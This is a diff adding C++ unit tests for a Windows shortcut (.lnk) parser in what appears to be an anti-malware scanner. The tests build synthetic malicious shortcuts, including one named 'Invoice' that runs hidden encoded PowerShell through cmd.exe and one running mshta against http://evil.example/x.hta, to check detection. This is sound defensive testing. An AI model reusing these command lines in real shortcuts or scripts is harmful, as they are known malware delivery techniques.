@@ -24,6 +24,7 @@
 #include "antimal/Report.h"
 #include "antimal/Scanner.h"
 #include "antimal/Screenshot.h"
+#include "antimal/ShellLinkParser.h"
 #include "antimal/Strings.h"
 #include "antimal/Subprocess.h"
 #include "antimal/Tagger.h"
@@ -3465,6 +3466,139 @@ void TestFileTypeId() {
   GetModuleFileNameW(nullptr, modulePath, MAX_PATH);
   Expect(antimal::ScanFile(modulePath).detectedType == "pe",
          "scanned test exe is detected as pe by magic bytes");
+}
+
+// Windows shell-link (.lnk) parsing. Builds synthetic MS-SHLLINK files and
+// asserts the embedded command line + weaponized-LOLBin detection. .lnk is a
+// top malware delivery format; the value is recovering "this shortcut runs
+// powershell -enc ...".
+void TestShellLinkParser() {
+  using antimal::ParseShellLink;
+  using antimal::ShellLinkInfo;
+
+  auto putU16 = [](std::vector<uint8_t> &v, uint16_t x) {
+    v.push_back(static_cast<uint8_t>(x & 0xFF));
+    v.push_back(static_cast<uint8_t>((x >> 8) & 0xFF));
+  };
+  auto putU32 = [](std::vector<uint8_t> &v, uint32_t x) {
+    for (int i = 0; i < 4; ++i) v.push_back(static_cast<uint8_t>((x >> (8 * i)) & 0xFF));
+  };
+  // Build a header-only LNK with the given LinkFlags (no IDList / no LinkInfo).
+  auto header = [&](uint32_t linkFlags) {
+    std::vector<uint8_t> v;
+    putU32(v, 0x4C); // HeaderSize
+    const uint8_t clsid[16] = {0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
+                               0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46};
+    for (uint8_t b : clsid) v.push_back(b);
+    putU32(v, linkFlags);     // LinkFlags
+    putU32(v, 0);             // FileAttributes
+    for (int i = 0; i < 8 * 3; ++i) v.push_back(0); // Creation/Access/Write times
+    putU32(v, 0);             // FileSize
+    putU32(v, 0);             // IconIndex
+    putU32(v, 1);             // ShowCommand
+    putU16(v, 0);             // HotKey
+    putU16(v, 0);             // Reserved1
+    putU32(v, 0);             // Reserved2
+    putU32(v, 0);             // Reserved3
+    return v; // exactly 0x4C bytes
+  };
+  auto putAsciiSD = [&](std::vector<uint8_t> &v, const std::string &s) {
+    putU16(v, static_cast<uint16_t>(s.size()));
+    for (char c : s) v.push_back(static_cast<uint8_t>(c));
+  };
+  auto putUtf16SD = [&](std::vector<uint8_t> &v, const std::string &s) {
+    putU16(v, static_cast<uint16_t>(s.size())); // ASCII subset: 1 char == 1 code unit
+    for (char c : s) {
+      v.push_back(static_cast<uint8_t>(c));
+      v.push_back(0x00);
+    }
+  };
+
+  // --- ASCII weaponized LNK: cmd.exe target launching powershell -enc ---
+  {
+    const uint32_t HasName = 0x04, HasRelativePath = 0x08, HasArguments = 0x20;
+    auto v = header(HasName | HasRelativePath | HasArguments);
+    putAsciiSD(v, "Invoice");                                  // NAME_STRING
+    putAsciiSD(v, "..\\..\\Windows\\System32\\cmd.exe");       // RELATIVE_PATH
+    putAsciiSD(v, "/c powershell -nop -w hidden -enc QQBCAEMA"); // ARGUMENTS
+    const ShellLinkInfo info = ParseShellLink(v);
+    Expect(info.isLnk, "LNK: valid header parses");
+    Expect(!info.isUnicode, "LNK: ASCII flag");
+    Expect(info.name == "Invoice", "LNK: NAME_STRING recovered");
+    Expect(info.relativePath.find("cmd.exe") != std::string::npos,
+           "LNK: RELATIVE_PATH recovered");
+    Expect(info.commandLineArgs.find("powershell -nop") != std::string::npos,
+           "LNK: COMMAND_LINE_ARGUMENTS recovered");
+    Expect(info.runsLolbin, "LNK: cmd.exe + powershell args -> weaponized");
+    Expect(info.lolbin == "cmd" || info.lolbin == "powershell",
+           "LNK: a LOLBin is named");
+  }
+
+  // --- Unicode LNK: mshta remote payload ---
+  {
+    const uint32_t HasArguments = 0x20, IsUnicode = 0x80;
+    auto v = header(HasArguments | IsUnicode);
+    putUtf16SD(v, "mshta http://evil.example/x.hta");
+    const ShellLinkInfo info = ParseShellLink(v);
+    Expect(info.isLnk && info.isUnicode, "LNK: unicode header parses");
+    Expect(info.commandLineArgs.find("mshta") != std::string::npos,
+           "LNK: unicode arguments decoded");
+    Expect(info.runsLolbin && info.lolbin == "mshta",
+           "LNK: mshta in args -> weaponized");
+  }
+
+  // --- Benign LNK: points at a document, no LOLBin ---
+  {
+    const uint32_t HasRelativePath = 0x08;
+    auto v = header(HasRelativePath);
+    putAsciiSD(v, "..\\Documents\\readme.txt");
+    const ShellLinkInfo info = ParseShellLink(v);
+    Expect(info.isLnk && !info.runsLolbin, "LNK: benign document shortcut not weaponized");
+  }
+
+  // --- Malformed inputs never crash and never claim isLnk ---
+  Expect(!ParseShellLink({}).isLnk, "LNK: empty input rejected");
+  Expect(!ParseShellLink({0x4C, 0x00, 0x00, 0x00}).isLnk, "LNK: short header rejected");
+  {
+    auto v = header(0x20);
+    v[4] = 0xFF; // corrupt the LinkCLSID
+    Expect(!ParseShellLink(v).isLnk, "LNK: wrong CLSID rejected");
+  }
+  {
+    // ARGUMENTS flag set but the StringData claims more chars than remain ->
+    // bounded read, partial result, no crash.
+    const uint32_t HasArguments = 0x20;
+    auto v = header(HasArguments);
+    putU16(v, 0xFFFF); // count 65535, but no bytes follow
+    const ShellLinkInfo info = ParseShellLink(v);
+    Expect(info.isLnk, "LNK: oversize StringData count does not crash; header still valid");
+    Expect(info.commandLineArgs.empty(), "LNK: oversize StringData yields no args");
+  }
+
+  // --- End-to-end: ScanFile routes a .lnk by magic bytes and surfaces the
+  // weaponized-shortcut finding (without the routing this finding never fires).
+  {
+    const uint32_t HasRelativePath = 0x08, HasArguments = 0x20;
+    auto v = header(HasRelativePath | HasArguments);
+    putAsciiSD(v, "..\\..\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe");
+    putAsciiSD(v, "-nop -w hidden -enc SQBFAFgA");
+    const auto tmp = std::filesystem::temp_directory_path() /
+                     "antimal_test_shortcut.lnk";
+    {
+      std::ofstream os(tmp, std::ios::binary);
+      os.write(reinterpret_cast<const char *>(v.data()),
+               static_cast<std::streamsize>(v.size()));
+    }
+    const antimal::ScanResult r = antimal::ScanFile(tmp);
+    std::error_code ec;
+    std::filesystem::remove(tmp, ec);
+    Expect(r.detectedType == "lnk", "LNK scan: identified as lnk by magic bytes");
+    bool weaponized = false;
+    for (const auto &f : r.findings) {
+      if (f.ruleId == "lnk.weaponized") weaponized = true;
+    }
+    Expect(weaponized, "LNK scan: weaponized-shortcut finding surfaced");
+  }
 }
 
 // Import-table -> behavioral-capability mapping (the static "what can this do"
@@ -7381,6 +7515,7 @@ int main() {
     TestSelectRunsToReclaim();
     TestMd5AndImphash();
     TestFileTypeId();
+    TestShellLinkParser();
     TestImportCapabilities();
     TestBrowserRisk();
     TestStringExtraction();
